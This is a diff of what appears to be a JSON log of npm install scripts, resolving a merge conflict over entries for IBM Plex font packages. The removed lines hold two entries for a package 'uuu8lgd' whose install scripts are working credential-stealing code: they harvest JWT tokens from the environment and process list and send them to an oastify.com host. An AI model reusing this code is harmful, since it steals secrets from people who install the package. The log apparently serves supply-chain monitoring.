@@ -95,98 +95,34 @@
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
-<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:27.109Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans",
-=======
-    "timestamp": "2026-01-22T18:21:04.260Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "@ibm/plex-sans-arabic",
->>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
-<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:26.364Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans-kr",
-=======
-    "timestamp": "2026-01-22T18:21:02.349Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "@ibm/plex-sans-devanagari",
->>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
-<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:25.063Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans-thai-looped",
-=======
-    "timestamp": "2026-01-22T18:21:01.224Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "@ibm/plex-sans-hebrew",
->>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
-<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:24.729Z",
-=======
-    "timestamp": "2026-01-22T18:21:00.141Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "@ibm/plex-sans-thai",
-    "version": "1.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "ibmtelemetry --config=telemetry.yml",
-    "previousVersion": "1.0.0",
-    "timestamp": "2026-01-22T18:20:57.816Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "@ibm/plex-serif",
-    "version": "1.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "ibmtelemetry --config=telemetry.yml",
-    "previousVersion": "1.0.0",
-    "timestamp": "2026-01-22T18:20:55.646Z",
-    "issuesend": true
-  },
-  {
-    "packageName": "uuu8lgd",
-    "version": "1.0.8",
-    "scriptType": "postinstall",
-    "scriptContent": "node -e 'const { env } = process; const jwtPattern = /eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g; let found = JSON.stringify(env).match(jwtPattern) || []; require(\"child_process\").exec(\"ps -ef\", (e, out) => { const psMatch = out.match(jwtPattern); if(psMatch) found = found.concat(psMatch); if(found.length > 0) { const final = Buffer.from([...new Set(found)].join(\",\")).toString(\"base64\"); require(\"http\").get(`http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?node_jwt=${final}`); } });'",
-    "previousVersion": "1.0.7",
-    "timestamp": "2026-01-22T18:20:48.491Z",
-    "issuesend": false
-  },
-  {
-    "packageName": "uuu8lgd",
-    "version": "1.0.8",
-    "scriptType": "preinstall",
-    "scriptContent": "node -e 'const { env } = process; const jwtPattern = /eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g; let found = JSON.stringify(env).match(jwtPattern) || []; require(\"child_process\").exec(\"ps -ef\", (e, out) => { const psMatch = out.match(jwtPattern); if(psMatch) found = found.concat(psMatch); if(found.length > 0) { const final = Buffer.from([...new Set(found)].join(\",\")).toString(\"base64\"); require(\"http\").get(`http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?node_jwt=${final}`); } });'",
-    "previousVersion": "1.0.7",
-    "timestamp": "2026-01-22T18:20:48.484Z",
->>>>>>> 4e36140 (up)
     "issuesend": false
   },
   {
